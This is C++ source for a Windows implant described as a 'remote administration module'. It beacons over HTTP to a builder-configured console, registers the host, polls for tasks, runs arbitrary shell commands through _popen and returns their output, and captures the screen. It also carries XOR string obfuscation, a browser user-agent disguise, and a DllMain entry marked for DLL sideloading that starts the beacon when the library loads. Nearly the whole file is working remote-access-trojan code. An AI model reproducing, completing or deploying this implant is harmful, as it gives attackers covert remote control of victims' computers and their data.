// Windows KAAL Agent – Remote Administration Module
// Compiles with MinGW: ~45KB stripped
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>
#pragma comment(lib, "wininet.lib")

// ============= CONFIGURATION (injected by builder) =============
#define CONSOLE_HOST "localhost"
#define CONSOLE_PORT 8080
#define BEACON_INTERVAL 30

// ============= XOR OBFUSCATION =============
#define XOR_KEY 0x77
class StringObf {
public:
    static void decrypt(char* s) {
        while(*s) { *s ^= XOR_KEY; s++; }
    }
};

// ============= GLOBAL STATE =============
char g_agent_id[64] = {0};
char g_console_url[128] = {0};

// ============= AGENT IDENTIFICATION =============
void GenerateAgentID() {
    char comp[256];
    DWORD sz = sizeof(comp);
    GetComputerNameA(comp, &sz);
    DWORD vol;
    GetVolumeInformationA("C:\\", NULL, 0, &vol, NULL, NULL, NULL, 0);
    sprintf(g_agent_id, "%s-%08x", comp, vol);
}

void BuildConsoleURL() {
    sprintf(g_console_url, "http://%s:%d", CONSOLE_HOST, CONSOLE_PORT);
}

// ============= HTTP COMMUNICATION =============
bool HttpPost(const char* url, const char* data, std::string& response) {
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,0,0,0);
    if(!hNet) return false;
    HINTERNET hConn = InternetConnectA(hNet, CONSOLE_HOST, CONSOLE_PORT,0,0,INTERNET_SERVICE_HTTP,0,0);
    if(!hConn) { InternetCloseHandle(hNet); return false; }
    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", url,0,0,0,0,0);
    if(!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hNet); return false; }
    char headers[] = "Content-Type: application/json\r\n";
    bool ok = false;
    if(HttpSendRequestA(hReq, headers, strlen(headers), (LPVOID)data, strlen(data))) {
        char buf[4096];
        DWORD read;
        response.clear();
        while(InternetReadFile(hReq, buf, sizeof(buf), &read) && read > 0)
            response.append(buf, read);
        ok = true;
    }
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hNet);
    return ok;
}

bool HttpGet(const char* url, std::string& response) {
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,0,0,0);
    if(!hNet) return false;
    HINTERNET hConn = InternetConnectA(hNet, CONSOLE_HOST, CONSOLE_PORT,0,0,INTERNET_SERVICE_HTTP,0,0);
    if(!hConn) { InternetCloseHandle(hNet); return false; }
    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", url,0,0,0,0,0);
    if(!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hNet); return false; }
    bool ok = false;
    if(HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
        char buf[4096];
        DWORD read;
        response.clear();
        while(InternetReadFile(hReq, buf, sizeof(buf), &read) && read > 0)
            response.append(buf, read);
        ok = true;
    }
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hNet);
    return ok;
}

// ============= COMMAND EXECUTION =============
std::string ExecuteCmd(const char* cmd) {
    std::string result;
    char buf[128];
    FILE* pipe = _popen(cmd, "r");
    if(pipe) {
        while(fgets(buf, sizeof(buf), pipe))
            result += buf;
        _pclose(pipe);
    }
    return result;
}

// ============= AGENT REGISTRATION =============
void RegisterAgent() {
    char json[512];
    sprintf(json, "{\"agent_id\":\"%s\",\"type\":\"register\",\"platform\":\"windows\",\"hostname\":\"%s\"}",
            g_agent_id, g_agent_id);
    std::string resp;
    HttpPost("/api/v1/register", json, resp);
}

// ============= RESULT REPORTING =============
void SendResult(const char* task_id, const char* result) {
    char json[2048];
    sprintf(json, "{\"agent_id\":\"%s\",\"type\":\"result\",\"task_id\":\"%s\",\"result\":\"%s\"}",
            g_agent_id, task_id, result);
    std::string resp;
    HttpPost("/api/v1/result", json, resp);
}

// ============= SCREEN CAPTURE =============
void CaptureScreen() {
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    HDC memdc = CreateCompatibleDC(hdc);
    HBITMAP hbmp = CreateCompatibleBitmap(hdc, x, y);
    SelectObject(memdc, hbmp);
    BitBlt(memdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
    // In a full implementation, encode as PNG and upload
    DeleteObject(hbmp);
    DeleteDC(memdc);
    ReleaseDC(NULL, hdc);
    SendResult("0", "[screen capture completed]");
}

// ============= MAIN BEACON LOOP =============
DWORD WINAPI BeaconThread(LPVOID) {
    RegisterAgent();
    while(true) {
        char url[256];
        sprintf(url, "/api/v1/task/%s", g_agent_id);
        std::string resp;
        if(HttpGet(url, resp)) {
            // Simple command parser (JSON parsing would be better)
            if(resp.find("screenshot") != std::string::npos)
                CaptureScreen();
            else if(resp.find("exec ") != std::string::npos) {
                size_t pos = resp.find("exec ");
                if(pos != std::string::npos) {
                    std::string cmd = resp.substr(pos+5);
                    std::string out = ExecuteCmd(cmd.c_str());
                    SendResult("0", out.c_str());
                }
            }
            else if(resp.find("download ") != std::string::npos) {
                // File download functionality
            }
        }
        Sleep(BEACON_INTERVAL * 1000);
    }
    return 0;
}

// ============= DLL ENTRY POINT (for sideloading) =============
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if(reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        GenerateAgentID();
        BuildConsoleURL();
        CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
    }
    return TRUE;
}

// ============= EXE ENTRY POINT =============
#ifdef _WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    GenerateAgentID();
    BuildConsoleURL();
    BeaconThread(NULL);
    return 0;
}
#endif
